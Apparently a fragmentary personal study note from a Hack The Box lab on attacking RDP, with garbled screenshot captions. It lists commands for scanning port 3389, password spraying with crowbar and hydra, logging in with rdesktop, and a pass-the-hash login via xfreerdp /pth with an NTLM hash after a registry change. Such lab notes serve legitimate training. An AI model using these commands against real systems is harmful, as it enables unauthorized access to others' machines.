...
Attacking RDP  
```
Pavlo142@htb[/htb]# nmap -Pn -p3389 192.168.2.143 
...
Attacking RDP  
```
Pavlo142@htb[/htb]# cat usernames.txt 
...
Attacking RDP  
```
Pavlo142@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
...
Attacking RDP  
```
Pavlo142@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
...
Attacking RDP  
```
Pavlo142@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143
...
```
![•o superstore-xy: 192:100.220.12](Attachments/884D1DEC-011C-4BF4-BF91-2FE0AFC772F9.jpg)  
...
![Tack Manager](Attachments/5B22476F-15FF-4BBE-BF75-6ECA500217A6.jpg)  
...
```
![Administratoe Windows Powere](Attachments/49D4211E-0C4F-4B21-85A4-E8706282CAE1.jpg)  
...
![Adminitraor Windows PowerShel](Attachments/1FFCDF75-7C53-4837-A9A3-A6A787B9059A.jpg)  
...
![Account restrictions are preventing this user from signing in. For example: blank](Attachments/D74265E5-01AA-4DC6-B055-FCED191CEC92.png)  
...
```
![OSTerHCEY LOCAL MACHINE](Attachments/9FFD6FC3-6C9A-45F6-8760-A264119AFA07.png)  
Once the registry key is added, we can use ****xfreerdp**** with the option ****/pth**** to gain RDP access:  
    
    
Attacking RDP  
```
Pavlo142@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
...
![Sxfreerdo /vilowen /oth: MFFSE89EF33F83A8)&C106S489029 /v:192,168.220,153](Attachments/82D0C03D-E276-4477-B5EA-95982D1712B7.jpg)  
